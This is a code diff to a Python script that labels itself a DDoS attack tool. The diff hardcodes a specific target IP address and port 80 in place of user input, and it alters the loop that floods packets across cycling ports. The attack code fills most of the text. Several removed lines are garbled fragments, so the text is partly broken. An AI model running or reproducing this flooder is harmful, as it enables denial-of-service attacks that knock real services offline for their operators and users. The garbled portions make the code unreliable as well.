@@ -22,8 +22,8 @@ os.system("figlet DDos Attack")
 print ("Author   : Dee")
 print ("github   : https://github.com/wendale1231")
 print ("Facebook : https://www.facebook.com/babblefour")
-ip = input("IP Target : ")
-port = input("Port       : ")
+ip = "35.185.157.82"
+port = 80
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -44,10 +44,7 @@ while True:
     sent += 1
     port = int(port) + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
-    if port == 65534:
+    if port == 1899:
       port = 1
   except:
-    print ("trying again..")
-)
-k")
-int("Error Last Attack")
+  	print ("Error Last Attack")
